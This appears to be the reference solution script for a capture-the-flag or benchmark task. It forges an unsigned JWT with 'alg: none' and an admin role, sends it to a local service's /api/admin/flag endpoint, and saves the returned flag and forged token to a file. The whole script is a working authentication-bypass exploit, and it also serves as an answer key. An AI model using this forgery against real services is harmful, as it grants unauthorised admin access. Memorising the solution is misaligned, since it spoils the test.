#!/usr/bin/env bash
set -euo pipefail

# Ensure the local service is up (oracle path; harmless if already running).
python3 - <<'PY'
import time
import urllib.request
for _ in range(40):
    try:
        urllib.request.urlopen("http://127.0.0.1:8080/health", timeout=1)
        break
    except Exception:
        time.sleep(0.5)
else:
    raise SystemExit("service did not become healthy")
PY

python3 - <<'PY'
import base64
import json
import urllib.request
from pathlib import Path


def b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()


# Forge an unsigned token: header alg=none, payload role=admin.
header = b64url(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode())
payload = b64url(
    json.dumps(
        {"sub": "analyst-2049", "role": "admin", "iat": 0, "exp": 9_999_999_999},
        separators=(",", ":"),
    ).encode()
)
forged = f"{header}.{payload}."

req = urllib.request.Request(
    "http://127.0.0.1:8080/api/admin/flag",
    headers={"Authorization": f"Bearer {forged}"},
)
with urllib.request.urlopen(req, timeout=5) as resp:
    data = json.load(resp)

result = {
    "flag": data["flag"],
    "forged_token": forged,
    "algorithm": "none",
}
Path("/app/admin_flag.json").write_text(json.dumps(result, indent=2) + "\n")
print(result["flag"])
PY
